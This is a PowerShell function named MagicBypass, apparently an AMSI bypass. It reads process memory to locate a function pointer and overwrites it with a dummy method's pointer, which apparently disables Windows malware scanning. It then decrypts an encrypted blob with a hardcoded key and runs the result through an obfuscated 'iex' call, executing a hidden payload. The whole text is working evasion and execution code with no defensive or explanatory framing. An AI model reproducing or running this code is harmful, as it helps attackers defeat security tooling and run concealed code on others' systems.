function MagicBypass {
    :initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
        [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
        $ReadedMemoryArray = [byte[]]::new($ReadBytes)
        $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
        for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
        $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
        [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
        if ($PointerToCompare -eq $funcAddr) {
            Write-Host "Found @ $($j) : $($i)!"
            [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
            break initialloop
        }
        }
    }
    [IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
    $buf = [IntPtr[]] ($DummyPointer)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)

    $FinishDate=Get-Date;
    $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
    Write-Host "$TimeElapsed seconds"
    Write-Host "ANjayy alok"
    ( [rUntiME.iNteroPServIcEs.mARshal]::ptRtOstRiNgAuto([RunTiME.InTEroPsErVIcEs.MaRSHAl]::secuReSTRINgtobSTR($('76492d1116743f0423413b16050a5345MgB8AFIAUAB5ADIASgBRAC8ARwBsAFkARwB4AE8AbQBmAGkAeQBmADUAcAA3AEEAPQA9AHwAZQA4AGUANQA0ADQAZABkADQAMgA4ADUANgAwAGYANwA2AGEAYgAwADcANAA5ADUAYgA5ADAAMgBkAGEANwBhAGYANAAzADgAMgA2AGIAZQBmADEAYgBhADAANABjADYANAAzADYAMQBmAGMANgA1AGYAMQBiADgAYgA1ADUANwA2ADUAZABhAGEAYQAyADMAMwAwADkANgBiADEAMgA1ADgAYQBiADEAZAAxAGQAMgBmADcAZQBlAGYANQBkADIA'|cONVErTto-sEcurEstrInG -Ke (153..184)) ) ))|.((Get-VaRIabLe '*mdr*').naME[3,11,2]-joiN'')
}
